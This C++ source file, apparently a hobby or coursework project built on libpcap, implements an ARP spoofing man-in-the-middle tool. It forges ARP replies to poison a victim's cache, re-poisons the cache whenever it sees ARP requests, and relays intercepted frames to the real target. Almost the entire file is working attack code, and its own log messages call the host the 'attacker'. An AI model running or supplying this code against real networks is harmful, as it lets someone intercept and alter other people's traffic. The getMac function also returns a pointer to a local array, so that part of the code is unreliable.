#include "arp.h"

Arp::Arp(char* _dev){
    this->dev = _dev;
}

uint8_t* Arp::getMac(uint32_t ip){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        exit(0);
    }
    u_char packet[LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H];
    Pkt arppkt(packet);

    arppkt.getMyMac(dev);
    arppkt.getMyIp(dev);

    arppkt.setArp(ARPOP_REQUEST);
    arppkt.setMac(arppkt.ethhdr->ether_dhost, 0xff);
    arppkt.setMac(arppkt.ethhdr->ether_shost, arppkt.my_mac);
    arppkt.setMac(arppkt.arphdr->ar_sha, arppkt.my_mac);
    arppkt.arphdr->ar_sip = arppkt.my_ip;
    arppkt.setMac(arppkt.arphdr->ar_tha, static_cast<uint8_t>(0x00));
    arppkt.arphdr->ar_tip = ip;
    time_t st = time(nullptr);
SENDPKT:
    pcap_sendpacket(handle, arppkt.pkt, LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H);
    time_t t = time(nullptr);
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* p;
        int res = pcap_next_ex(handle, &header, &p);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        Pkt pkt(p);
        if(pkt.isArp()){
            if(pkt.arphdr->ar_sip == arppkt.arphdr->ar_tip && pkt.arphdr->ar_tip == arppkt.my_ip && pkt.arphdr->lah.ar_op == ntohs(ARPOP_REPLY)){
                uint8_t tmpmac[6];
                uint8_t* macp;
                memcpy(tmpmac, pkt.arphdr->ar_sha, 6);
                macp = &tmpmac[0];
                pcap_close(handle);
                return macp;
            }
        }
        if((time(nullptr)-t) > 3) {
            if((time(nullptr)-st) > 60) break;
            printf("send REQ packet Again\n");
            goto SENDPKT;
        }
    }
    struct in_addr tmpip;
    tmpip.s_addr = ip;
    printf("There is no matching mac address for ip : %s\n", inet_ntoa(tmpip));
    printf("Please check ip address and run again\n");
    pcap_close(handle);
    exit(0);
}

uint8_t* Arp::findMac(uint32_t ip){
    return ipMac.find(ip)->second;
}

void Arp::sendArp(uint32_t sip, uint32_t tip){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        exit(0);
    }

    u_char packet[LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H];
    Pkt arppkt(packet);
    arppkt.getMyMac(dev);
    arppkt.setArp(ARPOP_REPLY);
    arppkt.setMac(arppkt.ethhdr->ether_dhost, findMac(sip));
    arppkt.setMac(arppkt.ethhdr->ether_shost, arppkt.my_mac);
    arppkt.setMac(arppkt.arphdr->ar_sha, arppkt.my_mac);
    arppkt.arphdr->ar_sip = tip;
    arppkt.setMac(arppkt.arphdr->ar_tha, findMac(sip));
    arppkt.arphdr->ar_tip = sip;
    pcap_sendpacket(handle, arppkt.pkt, LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H);
    pcap_close(handle);
}

void Arp::arpSpoof(uint32_t sip, uint32_t tip){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        exit(0);
    }
    getMyMac(dev);
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* p;
        int res = pcap_next_ex(handle, &header, &p);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        Pkt pkt(p);
        if(pkt.isArp()) {
            if(isSame(pkt.ethhdr->ether_shost, findMac(sip)) && isSame(pkt.ethhdr->ether_dhost, my_mac) && ntohs(pkt.arphdr->lah.ar_op) == ARPOP_REQUEST) {
                printf("[*][detect unicast sender to attacker] sender is %08X\n", sip);
                sendArp(sip, tip);
            }
            else if(isSame(pkt.ethhdr->ether_shost, findMac(tip)) && isSame(pkt.ethhdr->ether_dhost, brd_mac) && ntohs(pkt.arphdr->lah.ar_op) == ARPOP_REQUEST) {
                printf("[*][detect broadcast target to all] target is %08X\n", tip);
                sendArp(sip, tip);
            }
        }
        else {
            if(isSame(pkt.ethhdr->ether_dhost, my_mac)){
                printf("[*][not arp packet] change source mac & relay\n");
                memcpy(pkt.ethhdr->ether_shost, my_mac, 6);
                memcpy(pkt.ethhdr->ether_dhost, findMac(tip), 6);
                pcap_sendpacket(handle, p, header->caplen);
            }
        }
    }
}

thread Arp::spoofingThread(uint32_t sip, uint32_t tip){
    return thread([=] { arpSpoof(sip, tip); });
}

bool Arp::isSame(uint8_t* mac1, uint8_t* mac2){
    for (int i = 0; i < 6; i++) {
        if(mac1[i] != mac2[i]) return false;
    }
    return true;
}

